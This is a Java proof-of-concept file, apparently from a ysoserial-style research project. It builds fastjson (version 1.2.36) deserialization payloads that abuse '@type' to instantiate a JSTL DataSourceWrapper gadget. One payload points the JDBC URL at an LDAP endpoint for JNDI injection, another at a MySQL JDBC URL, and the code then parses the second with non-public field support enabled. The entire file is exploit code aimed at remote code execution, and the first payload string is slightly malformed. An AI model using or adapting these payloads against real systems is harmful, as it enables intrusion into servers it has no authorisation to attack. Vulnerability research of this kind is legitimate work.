package ysoserial.payloads.tabbyGadgetChains.Jetty;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;


/**
 * 1.2.36
 */
public class Poc4 {
    public static void main(String[] args) {
        String poc = "{" +
                "\"@type\": \"org.apache.taglibs.standard.tag.common.sql.DataSourceWrapper\"," +
                "\"jdbcURL\":\"ldap://127.0.0.1:8990/exp\""+
                "\"connection\":{\"$ref\": \"$.connection\"}"+
                "}";
        String poc2= "{\n" +
                "    {\n" +
                "        \"x\": {\n" +
                "                \"@type\": \"org.apache.taglibs.standard.tag.common.sql.DataSourceWrapper\",\n" +
                "                \"driverClassName\": \"com.mysql.cj.jdbc.Driver\",\n" +
                "                \"jdbcURL\": \"jdbc:mysql://127.0.0.1:8990/test\",\n" +
                "                \"userName\": \"cxc\",\n" +
                "                \"password\": \"cxc\",\n" +
                "        }\n" +
                "    }:\"xxx\"\n" +
                "}\n";



        JSON.parseObject(poc2, Feature.SupportNonPublicField);
    }
}
